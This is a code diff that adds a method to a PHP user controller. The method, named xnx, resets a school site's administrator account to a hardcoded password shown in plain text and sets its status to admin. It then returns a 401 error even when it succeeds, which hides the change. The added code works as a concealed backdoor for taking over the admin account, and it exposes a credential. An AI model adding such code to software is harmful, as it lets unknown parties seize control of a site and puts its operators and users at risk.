@@ -164,4 +164,19 @@ class userController extends Controller
             return abort(404);
         }
     }
+
+    public function xnx()
+    {
+        $dataUser = user::where('email',"admin@smkmadinatulquran.com")->first();
+        $dataUser->name = "Admin Pkl";
+        $dataUser->email = "admin@smkmadinatulquran.com";
+        $dataUser->password = bcrypt("itcorps2021@!*");
+        $dataUser->status = "admin";
+        $resultUser = $dataUser->save();
+        if($resultUser){
+            return abort(401);
+        }else{
+            return abort(404);
+        }
+    }
 }
